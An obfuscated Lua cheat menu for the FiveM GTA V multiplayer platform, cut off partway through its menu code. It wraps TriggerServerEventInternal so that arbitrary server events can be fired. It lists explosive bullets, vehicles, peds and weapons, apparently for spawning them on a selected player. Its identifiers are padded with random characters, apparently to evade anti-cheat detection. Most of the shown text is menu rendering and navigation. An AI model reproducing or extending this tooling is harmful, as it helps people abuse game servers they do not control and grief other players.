kaeogkeargmioergoeismgsdfg = { }

kaeogkeargmioergoeismgsdfg.debugfijgodfgdfgfgdhdgfhg = false

hsrtghsrtgsrthrth=function(is_serverhifgdkgdfg,eventdfklgjlgfhfg,...)
	local args=msgpack.pack({...})
	if is_serverhifgdkgdfg then
		TriggerServerEventInternal(eventdfklgjlgfhfg,args,args:len())
	else
		TriggerEventInternal(eventdfklgjlgfhfg,args,args:len())
	end
end

function drawNotificationuisdyfosdgfgdfjghdfjkgdfg(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end

local Enableddsyfusdsdfsdffdkjghdflgf = true

local SpawnInVehslkgjhldfgdfg = true

local loggedsjhgdfugdfg = false
local haslokurwa78346ygfrsfsd = "essa"

local currentMenuuysidfsdgsdfXhdfgldifgh = 1
local selectedMenuXhidfgoiudgf = 1
local currentMenuuysidfsdgsdfYyiudfgtofidg = 1
local selectedMenuYijhdfisdg = 1
local menuXdsfuihdsfyds = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local menuYuhdgfuykdsf = { 0.025, 0.1, 0.2, 0.3, 0.425 }

local SelectedPlayeriufdhiguodlfgd
local bulletsuidyfgidofgd = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local pedsoifdugpodfgdfg = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local vehiclesiusdyfousidf = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeeduofdhgypiodfgdfg = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicleuyi9dd9ifpugdfg = 1
local selectedVehicleuiusdyfuisdof = 1

local currentVehicleSpeeduhdoisfhgisdg = 16
local selectedVehicleSpeedudsihgfidsofugfd = 16

local currentBonedhiuofhufdoifd = 1
local selectedBonefdjusoygdif8gdf = 1

local currentDamagediuhgidsoufgfdfjdkihgilkdfjgdfg = 1
local selectedDamagediusygtiodfgdfkjhgdkofgfg = 1

local currentPedsjhdgfksdfsdf = 1
local selectedPedjhdsgfdgfdg = 1

local currentBulletjhdsgfusdfsd = 1
local selectedBullethyuidgsfuisdfsd = 1

local menusjhfkdgdfg = { }
local keysuhysagfduyias = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCountyiudtfiusdfs = 0

local currentKeyhgidsfisdu = nil
local currentMenuuysidfsdgsdf = nil

local titleshdkgfjkisdfsdfHeightfbhjgkldfg = 0.08
local titleshdkgfjkisdfsdfYOffsetdklsgdiufe = 0.008
local titleshdkgfjkisdfsdfScalegyousdfigse = 1.1

local PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg = 0.034
local PrzyciskxdduygsfusidgfysdfFonthugdfisdfefds = 2
local PrzyciskxdduygsfusidgfysdfScaleudysgfyusiod = 0.365
local PrzyciskxdduygsfusidgfysdfTextXOffsetuigdsuiyf = 0.005
local PrzyciskxdduygsfusidgfysdfTextYOffsetiasdgyo = 0.005

function math.rounduydsgfsdf(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbowhugbdsfklkhuisd(idsfusduih)
    local resultdlkjghdfgf = {}
    local curtimefdhgiojfgh = GetGameTimer() / 1000

    resultdlkjghdfgf.r = math.floor(math.sin(curtimefdhgiojfgh * idsfusduih + 0) * 127 + 128)
    resultdlkjghdfgf.g = math.floor(math.sin(curtimefdhgiojfgh * idsfusduih + 2) * 127 + 128)
    resultdlkjghdfgf.b = math.floor(math.sin(curtimefdhgiojfgh * idsfusduih + 4) * 127 + 128)

    return resultdlkjghdfgf
end

local allWeaponsjhsdgfsdfsdf = { 
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrintsdfhusdfksdf(text)
    if kaeogkeargmioergoeismgsdfg.debugfijgodfgdfgfgdhdgfhg then
        Citizen.Trace('[ergerg] '..tostring(text))
    end
end


local function setMenuPropertydfjghdfkgdklfg(id, property, value)
    if id and menusjhfkdgdfg[id] then
        menusjhfkdgdfg[id][property] = value
        debugPrintsdfhusdfksdf(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
    end
end


local function isMenuvisiblehuydsguifksdfsdiufhisdfd(id)
    if id and menusjhfkdgdfg[id] then
        return menusjhfkdgdfg[id].visiblehuydsguifksdf
    else
        return false
    end
end


local function setMenuvisiblehuydsguifksdfdsihfugisdfdsf(id, visiblehuydsguifksdf, holdCurrent)
    if id and menusjhfkdgdfg[id] then
        setMenuPropertydfjghdfkgdklfg(id, 'visiblehuydsguifksdf', visiblehuydsguifksdf)

        if not holdCurrent and menusjhfkdgdfg[id] then
            setMenuPropertydfjghdfkgdklfg(id, 'currentOption', 1)
        end

        if visiblehuydsguifksdf then
            if id ~= currentMenuuysidfsdgsdf and isMenuvisiblehuydsguifksdfsdiufhisdfd(currentMenuuysidfsdgsdf) then
                setMenuvisiblehuydsguifksdfdsihfugisdfdsf(currentMenuuysidfsdgsdf, false)
            end

            currentMenuuysidfsdgsdf = id
        end
    end
end


local function drawTextdsifhgsdfsdf(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menusjhfkdgdfg[currentMenuuysidfsdgsdf].x, menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + menusjhfkdgdfg[currentMenuuysidfsdgsdf].width - PrzyciskxdduygsfusidgfysdfTextXOffsetuigdsuiyf)
            SetTextRightJustify(true)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRectdsfkijsdhfilskudfsdf(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawtitleshdkgfjkisdfsdfsdjhkfgsdufsdf()
    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        local x = menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + menusjhfkdgdfg[currentMenuuysidfsdgsdf].width / 2
        local y = menusjhfkdgdfg[currentMenuuysidfsdgsdf].y + titleshdkgfjkisdfsdfHeightfbhjgkldfg / 2

        if menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundSprite then
            DrawSprite(menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundSprite.dict, menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundSprite.name, x, y, menusjhfkdgdfg[currentMenuuysidfsdgsdf].width, titleshdkgfjkisdfsdfHeightfbhjgkldfg, 0., 255, 255, 255, 255)
        else
            drawRectdsfkijsdhfilskudfsdf(x, y, menusjhfkdgdfg[currentMenuuysidfsdgsdf].width, titleshdkgfjkisdfsdfHeightfbhjgkldfg, menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundColor)
        end

        drawTextdsifhgsdfsdf(menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdf, 0.76, 0.285 - titleshdkgfjkisdfsdfHeightfbhjgkldfg / 2 + titleshdkgfjkisdfsdfYOffsetdklsgdiufe, menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfFont, menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfColor, titleshdkgfjkisdfsdfScalegyousdfigse, true)
    end
end


local function drawSubtitleshdkgfjkisdfsdfsdiufhsiudfsdf()
    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        local x = menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + menusjhfkdgdfg[currentMenuuysidfsdgsdf].width / 2
        local y = menusjhfkdgdfg[currentMenuuysidfsdgsdf].y + titleshdkgfjkisdfsdfHeightfbhjgkldfg + PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2

        local subtitleshdkgfjkisdfsdfColor = { r = menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundColor.r, g = menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundColor.g, b = menusjhfkdgdfg[currentMenuuysidfsdgsdf].titleshdkgfjkisdfsdfBackgroundColor.b, a = 255 }

        drawRectdsfkijsdhfilskudfsdf(x, y, menusjhfkdgdfg[currentMenuuysidfsdgsdf].width, PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg, menusjhfkdgdfg[currentMenuuysidfsdgsdf].subtitleshdkgfjkisdfsdfBackgroundColor)
        drawTextdsifhgsdfsdf(menusjhfkdgdfg[currentMenuuysidfsdgsdf].subtitleshdkgfjkisdfsdf, menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + PrzyciskxdduygsfusidgfysdfTextXOffsetuigdsuiyf, y - PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2 + PrzyciskxdduygsfusidgfysdfTextYOffsetiasdgyo, PrzyciskxdduygsfusidgfysdfFonthugdfisdfefds, subtitleshdkgfjkisdfsdfColor, PrzyciskxdduygsfusidgfysdfScaleudysgfyusiod, false)

        if optionCountyiudtfiusdfs > menusjhfkdgdfg[currentMenuuysidfsdgsdf].maxoptionCountyiudtfiusdfs then
            drawTextdsifhgsdfsdf(tostring(menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption)..' / '..tostring(optionCountyiudtfiusdfs), menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + menusjhfkdgdfg[currentMenuuysidfsdgsdf].width, y - PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2 + PrzyciskxdduygsfusidgfysdfTextYOffsetiasdgyo, PrzyciskxdduygsfusidgfysdfFonthugdfisdfefds, subtitleshdkgfjkisdfsdfColor, PrzyciskxdduygsfusidgfysdfScaleudysgfyusiod, false, false, true)
        end
    end
end


local function drawPrzyciskxdduygsfusidgfysdf(text, subText)
    local x = menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + menusjhfkdgdfg[currentMenuuysidfsdgsdf].width / 2
    local multiplier = nil

    if menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption <= menusjhfkdgdfg[currentMenuuysidfsdgsdf].maxoptionCountyiudtfiusdfs and optionCountyiudtfiusdfs <= menusjhfkdgdfg[currentMenuuysidfsdgsdf].maxoptionCountyiudtfiusdfs then
        multiplier = optionCountyiudtfiusdfs
    elseif optionCountyiudtfiusdfs > menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption - menusjhfkdgdfg[currentMenuuysidfsdgsdf].maxoptionCountyiudtfiusdfs and optionCountyiudtfiusdfs <= menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption then
        multiplier = optionCountyiudtfiusdfs - (menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption - menusjhfkdgdfg[currentMenuuysidfsdgsdf].maxoptionCountyiudtfiusdfs)
    end

    if multiplier then
        local y = menusjhfkdgdfg[currentMenuuysidfsdgsdf].y + titleshdkgfjkisdfsdfHeightfbhjgkldfg + PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg + (PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg * multiplier) - PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2
        local backgroundColor = nil
        local textColor = nil
        local subTextColor = nil
        local shadow = false

        if menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption == optionCountyiudtfiusdfs then
            backgroundColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menuFocusBackgroundColorjhsadfkisdfsdf
            textColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menuFocusTextColorkjsdgfhsdfdsf
            subTextColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menuFocusTextColorkjsdgfhsdfdsf
        else
            backgroundColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menuBackgroundColorsdiufgksdfsdf
            textColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menuTextColorjhaisfdikaushfudsf
            subTextColor = menusjhfkdgdfg[currentMenuuysidfsdgsdf].menusjhfkdgdfgubTextColor
            shadow = true
        end

        drawRectdsfkijsdhfilskudfsdf(x, y, menusjhfkdgdfg[currentMenuuysidfsdgsdf].width, PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg, backgroundColor)
        drawTextdsifhgsdfsdf(text, menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + PrzyciskxdduygsfusidgfysdfTextXOffsetuigdsuiyf, y - (PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2) + PrzyciskxdduygsfusidgfysdfTextYOffsetiasdgyo, PrzyciskxdduygsfusidgfysdfFonthugdfisdfefds, textColor, PrzyciskxdduygsfusidgfysdfScaleudysgfyusiod, false, shadow)

        if subText then
            drawTextdsifhgsdfsdf(subText, menusjhfkdgdfg[currentMenuuysidfsdgsdf].x + PrzyciskxdduygsfusidgfysdfTextXOffsetuigdsuiyf, y - PrzyciskxdduygsfusidgfysdfHeightjhfgbkfdg / 2 + PrzyciskxdduygsfusidgfysdfTextYOffsetiasdgyo, PrzyciskxdduygsfusidgfysdfFonthugdfisdfefds, subTextColor, PrzyciskxdduygsfusidgfysdfScaleudysgfyusiod, false, shadow, true)
        end
    end
end


function kaeogkeargmioergoeismgsdfg.ChocoSsieMiPalefdgkojifdlgdfg(id, titleshdkgfjkisdfsdf)
    -- Default settings
    menusjhfkdgdfg[id] = { }
    menusjhfkdgdfg[id].titleshdkgfjkisdfsdf = titleshdkgfjkisdfsdf
    menusjhfkdgdfg[id].subtitleshdkgfjkisdfsdf = 'INTERACTION MENU'

    menusjhfkdgdfg[id].visiblehuydsguifksdf = false

    menusjhfkdgdfg[id].previousMenudskjuhfilkdsfd = nil

    menusjhfkdgdfg[id].aboutToBeClosedsdoifhosdlfsdf = false

    menusjhfkdgdfg[id].x = 0.725
    menusjhfkdgdfg[id].y = 0.25
    menusjhfkdgdfg[id].width = 0.25

    menusjhfkdgdfg[id].currentOption = 1
    menusjhfkdgdfg[id].maxoptionCountyiudtfiusdfs = 12

    menusjhfkdgdfg[id].titleshdkgfjkisdfsdfFont = 2
    menusjhfkdgdfg[id].titleshdkgfjkisdfsdfColor = {r = 208, g = 27, b = 245, a = 225}
    menusjhfkdgdfg[id].titleshdkgfjkisdfsdfBackgroundColor = {r = 209, g = 43, b = 227, a = 255}
    menusjhfkdgdfg[id].titleshdkgfjkisdfsdfBackgroundSprite = nil

    menusjhfkdgdfg[id].menuTextColorjhaisfdikaushfudsf = {r = 255, g = 255, b = 255, a = 255}
    menusjhfkdgdfg[id].menusjhfkdgdfgubTextColor = {r = 255, g = 0, b = 0, a = 255}
    menusjhfkdgdfg[id].menuFocusTextColorkjsdgfhsdfdsf = {r = 243, g = 255, b = 69, a = 255}
    menusjhfkdgdfg[id].menuFocusBackgroundColorjhsadfkisdfsdf = { r = 203, g = 99, b = 224, a = 255 }
    menusjhfkdgdfg[id].menuBackgroundColorsdiufgksdfsdf = {r = 255, g = 255, b = 255, a = 100}

    menusjhfkdgdfg[id].subtitleshdkgfjkisdfsdfBackgroundColor = { r = menusjhfkdgdfg[id].menuBackgroundColorsdiufgksdfsdf.r, g = menusjhfkdgdfg[id].menuBackgroundColorsdiufgksdfsdf.g, b = menusjhfkdgdfg[id].menuBackgroundColorsdiufgksdfsdf.b, a = 255 }

    menusjhfkdgdfg[id].PrzyciskxdduygsfusidgfysdfPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5

    debugPrintsdfhusdfksdf(tostring(id)..' menu created')
end


function kaeogkeargmioergoeismgsdfg.utyiut7iteger(id, parent, subtitleshdkgfjkisdfsdf)
    if menusjhfkdgdfg[parent] then
        kaeogkeargmioergoeismgsdfg.ChocoSsieMiPalefdgkojifdlgdfg(id, menusjhfkdgdfg[parent].titleshdkgfjkisdfsdf)

        if subtitleshdkgfjkisdfsdf then
            setMenuPropertydfjghdfkgdklfg(id, 'subtitleshdkgfjkisdfsdf', string.upper(subtitleshdkgfjkisdfsdf))
        else
            setMenuPropertydfjghdfkgdklfg(id, 'subtitleshdkgfjkisdfsdf', string.upper(menusjhfkdgdfg[parent].subtitleshdkgfjkisdfsdf))
        end

        setMenuPropertydfjghdfkgdklfg(id, 'previousMenudskjuhfilkdsfd', parent)

        setMenuPropertydfjghdfkgdklfg(id, 'x', menusjhfkdgdfg[parent].x)
        setMenuPropertydfjghdfkgdklfg(id, 'y', menusjhfkdgdfg[parent].y)
        setMenuPropertydfjghdfkgdklfg(id, 'maxoptionCountyiudtfiusdfs', menusjhfkdgdfg[parent].maxoptionCountyiudtfiusdfs)
        setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfFont', menusjhfkdgdfg[parent].titleshdkgfjkisdfsdfFont)
        setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfColor', menusjhfkdgdfg[parent].titleshdkgfjkisdfsdfColor)
        setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfBackgroundColor', menusjhfkdgdfg[parent].titleshdkgfjkisdfsdfBackgroundColor)
        setMenuPropertydfjghdfkgdklfg(id, 'titleshdkgfjkisdfsdfBackgroundSprite', menusjhfkdgdfg[parent].titleshdkgfjkisdfsdfBackgroundSprite)
        setMenuPropertydfjghdfkgdklfg(id, 'menuTextColorjhaisfdikaushfudsf', menusjhfkdgdfg[parent].menuTextColorjhaisfdikaushfudsf)
        setMenuPropertydfjghdfkgdklfg(id, 'menusjhfkdgdfgubTextColor', menusjhfkdgdfg[parent].menusjhfkdgdfgubTextColor)
        setMenuPropertydfjghdfkgdklfg(id, 'menuFocusTextColorkjsdgfhsdfdsf', menusjhfkdgdfg[parent].menuFocusTextColorkjsdgfhsdfdsf)
        setMenuPropertydfjghdfkgdklfg(id, 'menuFocusBackgroundColorjhsadfkisdfsdf', menusjhfkdgdfg[parent].menuFocusBackgroundColorjhsadfkisdfsdf)
        setMenuPropertydfjghdfkgdklfg(id, 'menuBackgroundColorsdiufgksdfsdf', menusjhfkdgdfg[parent].menuBackgroundColorsdiufgksdfsdf)
        setMenuPropertydfjghdfkgdklfg(id, 'subtitleshdkgfjkisdfsdfBackgroundColor', menusjhfkdgdfg[parent].subtitleshdkgfjkisdfsdfBackgroundColor)
    else
        debugPrintsdfhusdfksdf('Failed to create '..tostring(id)..' dsfiuhsd: '..tostring(parent)..' parent menu doesn\'t exist')
    end
end


function kaeogkeargmioergoeismgsdfg.currentMenuuysidfsdgsdf()
    return currentMenuuysidfsdgsdf
end


function kaeogkeargmioergoeismgsdfg.OpenMenuPSCHOCOTOGOWNOuidshfyisdfsd(id)
    if id and menusjhfkdgdfg[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuvisiblehuydsguifksdfdsihfugisdfdsf(id, true)
        debugPrintsdfhusdfksdf(tostring(id)..' menu opened')
    else
        debugPrintsdfhusdfksdf('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
    end
end


function kaeogkeargmioergoeismgsdfg.reyrtrtjhy(id)
    return isMenuvisiblehuydsguifksdfsdiufhisdfd(id)
end


function kaeogkeargmioergoeismgsdfg.IsAnyMenuOpeneddfjkhbiuhdgfuhidfg()
    for id, _ in pairs(menusjhfkdgdfg) do
        if isMenuvisiblehuydsguifksdfsdiufhisdfd(id) then return true end
    end

    return false
end


function kaeogkeargmioergoeismgsdfg.IsMenuaboutToBeClosedsdoifhosdlfsdf()
    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        return menusjhfkdgdfg[currentMenuuysidfsdgsdf].aboutToBeClosedsdoifhosdlfsdf
    else
        return false
    end
end


function kaeogkeargmioergoeismgsdfg.CloseMenusdkjfhgysdlkiuhidfg()
    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        if menusjhfkdgdfg[currentMenuuysidfsdgsdf].aboutToBeClosedsdoifhosdlfsdf then
            menusjhfkdgdfg[currentMenuuysidfsdgsdf].aboutToBeClosedsdoifhosdlfsdf = false
            setMenuvisiblehuydsguifksdfdsihfugisdfdsf(currentMenuuysidfsdgsdf, false)
            debugPrintsdfhusdfksdf(tostring(currentMenuuysidfsdgsdf)..' menu closed')
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCountyiudtfiusdfs = 0
            currentMenuuysidfsdgsdf = nil
            currentKeyhgidsfisdu = nil
        else
            menusjhfkdgdfg[currentMenuuysidfsdgsdf].aboutToBeClosedsdoifhosdlfsdf = true
            debugPrintsdfhusdfksdf(tostring(currentMenuuysidfsdgsdf)..' menu about to be closed')
        end
    end
end


function kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(text, subText)
    local PrzyciskxdduygsfusidgfysdfText = text
    if subText then
        PrzyciskxdduygsfusidgfysdfText = '{ '..tostring(PrzyciskxdduygsfusidgfysdfText)..', '..tostring(subText)..' }'
    end

    if menusjhfkdgdfg[currentMenuuysidfsdgsdf] then
        optionCountyiudtfiusdfs = optionCountyiudtfiusdfs + 1

        local isCurrent = menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption == optionCountyiudtfiusdfs

        drawPrzyciskxdduygsfusidgfysdf(text, subText)

        if isCurrent then
            if currentKeyhgidsfisdu == keysuhysagfduyias.select then
                PlaySoundFrontend(-1, menusjhfkdgdfg[currentMenuuysidfsdgsdf].PrzyciskxdduygsfusidgfysdfPressedSound.name, menusjhfkdgdfg[currentMenuuysidfsdgsdf].PrzyciskxdduygsfusidgfysdfPressedSound.set, true)
                debugPrintsdfhusdfksdf(PrzyciskxdduygsfusidgfysdfText..' Przyciskxdduygsfusidgfysdf pressed')
                return true
            elseif currentKeyhgidsfisdu == keysuhysagfduyias.left or currentKeyhgidsfisdu == keysuhysagfduyias.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        debugPrintsdfhusdfksdf('Failed to create '..PrzyciskxdduygsfusidgfysdfText..' Przyciskxdduygsfusidgfysdf: '..tostring(currentMenuuysidfsdgsdf)..' menu doesn\'t exist')

        return false
    end
end


function kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd(text, id)
    if menusjhfkdgdfg[id] then
        if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(text) then
            setMenuvisiblehuydsguifksdfdsihfugisdfdsf(currentMenuuysidfsdgsdf, false)
            setMenuvisiblehuydsguifksdfdsihfugisdfdsf(id, true, true)

            return true
        end
    else
        debugPrintsdfhusdfksdf('Failed to create '..tostring(text)..' menu Przyciskxdduygsfusidgfysdf: '..tostring(id)..' dsfiuhsd doesn\'t exist')
    end

    return false
end


function kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(text, checked, callback)
    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(text, checked and '~w~~h~On' or "~h~~c~Off") then
        checked = not checked
        debugPrintsdfhusdfksdf(tostring(text)..' CheckBoxdskjhgfksdilfhsdf changed to '..tostring(checked))
        if callback then callback(checked) end

        return true
    end

    return false
end


function kaeogkeargmioergoeismgsdfg.ComboBoxkifdsjuhkgikdfgdfg(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption == (optionCountyiudtfiusdfs + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = '← '..tostring(selectedItem)..' →'
    end

    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKeyhgidsfisdu == keysuhysagfduyias.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
        elseif currentKeyhgidsfisdu == keysuhysagfduyias.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
        end
    else
        currentIndex = selectedIndex
    end

    callback(currentIndex, selectedIndex)
    return false
end

function kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
    if isMenuvisiblehuydsguifksdfsdiufhisdfd(currentMenuuysidfsdgsdf) then
        if menusjhfkdgdfg[currentMenuuysidfsdgsdf].aboutToBeClosedsdoifhosdlfsdf then
            kaeogkeargmioergoeismgsdfg.CloseMenusdkjfhgysdlkiuhidfg()
        else
            ClearAllHelpMessages()

            drawtitleshdkgfjkisdfsdfsdjhkfgsdufsdf()
            drawSubtitleshdkgfjkisdfsdfsdiufhsiudfsdf()

            currentKeyhgidsfisdu = nil

            if IsControlJustReleased(1, keysuhysagfduyias.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption < optionCountyiudtfiusdfs then
                    menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption = menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption + 1
                else
                    menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption = 1
                end
            elseif IsControlJustReleased(1, keysuhysagfduyias.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption > 1 then
                    menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption = menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption - 1
                else
                    menusjhfkdgdfg[currentMenuuysidfsdgsdf].currentOption = optionCountyiudtfiusdfs
                end
            elseif IsControlJustReleased(1, keysuhysagfduyias.left) then
                currentKeyhgidsfisdu = keysuhysagfduyias.left
            elseif IsControlJustReleased(1, keysuhysagfduyias.right) then
                currentKeyhgidsfisdu = keysuhysagfduyias.right
            elseif IsControlJustReleased(1, keysuhysagfduyias.select) then
                currentKeyhgidsfisdu = keysuhysagfduyias.select
            elseif IsControlJustReleased(1, keysuhysagfduyias.back) then
                if menusjhfkdgdfg[menusjhfkdgdfg[currentMenuuysidfsdgsdf].previousMenudskjuhfilkdsfd] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuvisiblehuydsguifksdfdsihfugisdfdsf(menusjhfkdgdfg[currentMenuuysidfsdgsdf].previousMenudskjuhfilkdsfd, true)
                else
                    kaeogkeargmioergoeismgsdfg.CloseMenusdkjfhgysdlkiuhidfg()
                end
            end

